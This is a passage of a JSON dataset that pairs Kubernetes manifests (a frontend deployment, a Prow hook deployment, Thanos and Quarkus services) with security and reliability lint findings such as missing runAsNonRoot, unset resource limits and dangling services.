    "violation_text": "container \"my-nginx\" has memory limit 0"
  },
  {
    "id": "10165",
    "manifest_path": "data/manifests/the_stack_sample/sample_3915.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: azorinmsu/frontend:v0.0.1\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10166",
    "manifest_path": "data/manifests/the_stack_sample/sample_3915.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: azorinmsu/frontend:v0.0.1\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "10167",
    "manifest_path": "data/manifests/the_stack_sample/sample_3915.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: azorinmsu/frontend:v0.0.1\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "10168",
    "manifest_path": "data/manifests/the_stack_sample/sample_3915.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: azorinmsu/frontend:v0.0.1\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "10169",
    "manifest_path": "data/manifests/the_stack_sample/sample_3915.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: azorinmsu/frontend:v0.0.1\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "10170",
    "manifest_path": "data/manifests/the_stack_sample/sample_3917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210205-451988f24f\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "10171",
    "manifest_path": "data/manifests/the_stack_sample/sample_3917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210205-451988f24f\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10172",
    "manifest_path": "data/manifests/the_stack_sample/sample_3917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210205-451988f24f\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hook\" does not have a read-only root file system"
  },
  {
    "id": "10173",
    "manifest_path": "data/manifests/the_stack_sample/sample_3917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210205-451988f24f\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"hook\" not found"
  },
  {
    "id": "10174",
    "manifest_path": "data/manifests/the_stack_sample/sample_3917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210205-451988f24f\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "10175",
    "manifest_path": "data/manifests/the_stack_sample/sample_3917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210205-451988f24f\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hook\" is not set to runAsNonRoot"
  },
  {
    "id": "10176",
    "manifest_path": "data/manifests/the_stack_sample/sample_3917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210205-451988f24f\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hook\" has cpu request 0"
  },
  {
    "id": "10177",
    "manifest_path": "data/manifests/the_stack_sample/sample_3917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210205-451988f24f\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hook\" has memory limit 0"
  },
  {
    "id": "10178",
    "manifest_path": "data/manifests/the_stack_sample/sample_3918.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: thanos-ruler\n  namespace: default\n  labels:\n    app: thanos-ruler\nspec:\n  selector:\n    app: thanos-ruler\n  ports:\n  - name: grpc\n    port: 10901\n    targetPort: grpc\n  - name: http\n    port: 10902\n    targetPort: web\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:thanos-ruler])"
  },
  {
    "id": "10179",
    "manifest_path": "data/manifests/the_stack_sample/sample_3919.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/fib-quarkus-deploy: runtime/default\n  labels:\n    app: fib\n    app.kubernetes.io/component: backend\n    app.kubernetes.io/instance: fib-service-in-quarkus\n    app.kubernetes.io/name: fib-quarkus-deploy\n    app.kubernetes.io/part-of: fib-service\n    app.openshift.io/runtime: quarkus\n  name: fib-quarkus-deploy\n  namespace: jduimovich-dev\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: fib\n  template:\n    metadata:\n      labels:\n        app: fib\n    spec:\n      containers:\n      - image: quay.io/jduimovich0/fib-quarkus:demo\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /fib\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 60\n          periodSeconds: 5\n          successThreshold: 1\n          timeoutSeconds: 1\n        name: fib-quarkus-deploy\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          initialDelaySeconds: 60\n          periodSeconds: 10\n          successThreshold: 1\n          tcpSocket:\n            port: 8080\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 200m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 512Mi\n        securityContext:\n          capabilities:\n            drop:\n            - all\n          readOnlyRootFilesystem: false\n      securityContext:\n        runAsNonRoot: true\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10180",
    "manifest_path": "data/manifests/the_stack_sample/sample_3919.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/fib-quarkus-deploy: runtime/default\n  labels:\n    app: fib\n    app.kubernetes.io/component: backend\n    app.kubernetes.io/instance: fib-service-in-quarkus\n    app.kubernetes.io/name: fib-quarkus-deploy\n    app.kubernetes.io/part-of: fib-service\n    app.openshift.io/runtime: quarkus\n  name: fib-quarkus-deploy\n  namespace: jduimovich-dev\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: fib\n  template:\n    metadata:\n      labels:\n        app: fib\n    spec:\n      containers:\n      - image: quay.io/jduimovich0/fib-quarkus:demo\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /fib\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 60\n          periodSeconds: 5\n          successThreshold: 1\n          timeoutSeconds: 1\n        name: fib-quarkus-deploy\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          initialDelaySeconds: 60\n          periodSeconds: 10\n          successThreshold: 1\n          tcpSocket:\n            port: 8080\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 200m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 512Mi\n        securityContext:\n          capabilities:\n            drop:\n            - all\n          readOnlyRootFilesystem: false\n      securityContext:\n        runAsNonRoot: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fib-quarkus-deploy\" does not have a read-only root file system"
  },
  {
    "id": "10181",
    "manifest_path": "data/manifests/the_stack_sample/sample_3921.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: apikeystore\nspec:\n  clusterIP: None\n  selector:\n    app: apikeystore\n  ports:\n  - name: http\n    port: 80\n    targetPort: 8401\n  - name: http2\n    port: 82\n    targetPort: 8402\n",
    "policy_id": "dangling-service",
